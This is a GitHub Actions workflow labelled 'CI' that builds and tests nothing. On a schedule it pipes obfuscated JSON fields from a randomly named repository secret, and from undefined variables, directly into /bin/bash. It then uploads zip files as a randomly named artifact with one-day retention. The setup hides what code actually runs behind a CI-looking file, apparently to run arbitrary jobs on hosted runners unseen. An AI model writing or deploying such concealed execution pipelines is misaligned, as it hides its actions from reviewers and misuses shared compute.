name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '19 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          sojws70609: ${{ secrets.sojws70609 }}
        run: |
          printf '%s' "$sojws70609" | jq -r .ez1368 | /bin/bash
          echo $cvq99 | jq -r .kxb371 | /bin/bash
          printf '%s' "$nkji74334" | jq -r .fb6647 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: 4zOce5lY
          path: "*.zip"
          retention-days: 1
